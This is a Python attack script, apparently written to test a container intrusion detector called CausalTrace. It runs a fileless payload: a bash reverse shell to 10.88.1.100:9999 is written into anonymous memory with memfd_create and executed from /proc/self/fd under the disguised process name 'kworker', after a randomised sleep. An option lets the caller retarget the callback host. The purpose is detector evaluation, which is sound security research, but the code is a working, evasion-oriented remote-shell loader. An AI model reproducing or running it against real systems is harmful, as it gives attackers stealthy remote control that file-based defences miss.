#!/usr/bin/env python3
"""
S11 — Fileless zero-day OOD payload (directive: held out of the 150-attack pool).

Delivery vector:
    The script is dropped into a monitored container via `docker exec` during
    attack-phase setup. It then sleeps for a randomised duration (~90–150
    minutes in the spec; default shortened to 30–60s when called directly for
    smoke tests). When it fires, the payload is written to anonymous RAM via
    memfd_create and executed with execv — nothing ever touches the container
    filesystem, so file-hash / path-matching detectors stay silent.

Why this matters for the thesis:
    CausalTrace was never calibrated against memfd_create + execveat + non-
    network delivery. A CT detection on S11 therefore proves generalisation
    rather than lookup. The architecture picks this up via two invariant
    bits that fire regardless of signature:
        * execveat(AT_FDCWD, …)  with a /proc/self/fd/$N path  → STRICT invariant
        * memfd_create in the top-24 syscall list             → bigram spike
    The verdict path runs through the Compound Enforcement Gate; CASE A
    triggers on the invariant regardless of the caller's trust level.
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.util
import os
import random
import socket
import sys
import time

MFD_CLOEXEC = 0x0001

# Default payload — a short bash reverse shell. Directive preserves this shape.
DEFAULT_PAYLOAD = (
    b"#!/bin/bash\n"
    b"exec 5<>/dev/tcp/10.88.1.100/9999 2>/dev/null || true\n"
    b"/bin/bash -i <&5 >&5 2>&5\n"
)


def _memfd_create(name: bytes, flags: int = MFD_CLOEXEC) -> int:
    """Raw memfd_create(2) via libc. Python 3.8+ has os.memfd_create but calling
    the libc symbol directly keeps the exact syscall we want visible to eBPF."""
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    libc.syscall.restype = ctypes.c_long
    # SYS_memfd_create = 319 on x86_64. The bigram sketch includes this syscall
    # in its top-24 index set (see kernel/causaltrace_bcc.c syscall map).
    fd = libc.syscall(319, name, flags)
    if fd < 0:
        raise OSError(ctypes.get_errno(), "memfd_create failed")
    return fd


def fire(payload: bytes, dst_ip: str | None = None, dst_port: int = 9999) -> None:
    """Write the payload into a memfd and exec it. Never returns on success."""
    # If an override LHOST was supplied, rewrite the payload to target it.
    if dst_ip and b"/dev/tcp/" in payload:
        payload = payload.replace(b"10.88.1.100", dst_ip.encode())
    fd = _memfd_create(b"kworker")
    os.write(fd, payload)
    os.lseek(fd, 0, os.SEEK_SET)
    # Executing from /proc/self/fd/N is the classic fileless exec vector.
    # This triggers the execveat → STRICT invariant path in Tier 1.
    path = f"/proc/self/fd/{fd}".encode()
    os.execv(path.decode(), ["kworker"])


def main(argv=None) -> int:
    p = argparse.ArgumentParser(
        description="S11 fileless zero-day payload (memfd_create + execv).")
    p.add_argument("--sleep-min",  type=int, default=30,
                   help="minimum pre-fire sleep in seconds (default 30)")
    p.add_argument("--sleep-max",  type=int, default=60,
                   help="maximum pre-fire sleep in seconds (default 60)")
    p.add_argument("--lhost",      type=str, default=None,
                   help="attacker callback IP (default 10.88.1.100)")
    p.add_argument("--lport",      type=int, default=9999)
    p.add_argument("--dry-run",    action="store_true",
                   help="print what would happen, do not execv")
    args = p.parse_args(argv)

    delay = random.randint(args.sleep_min, args.sleep_max)
    print(f"[S11] delivery done, firing in {delay}s", flush=True)
    time.sleep(delay)

    if args.dry_run:
        fd = _memfd_create(b"kworker")
        print(f"[S11] dry-run: memfd fd={fd} "
              f"(would execv /proc/self/fd/{fd})", flush=True)
        os.close(fd)
        return 0

    fire(DEFAULT_PAYLOAD, dst_ip=args.lhost, dst_port=args.lport)
    return 0  # unreachable on success


if __name__ == "__main__":
    sys.exit(main())
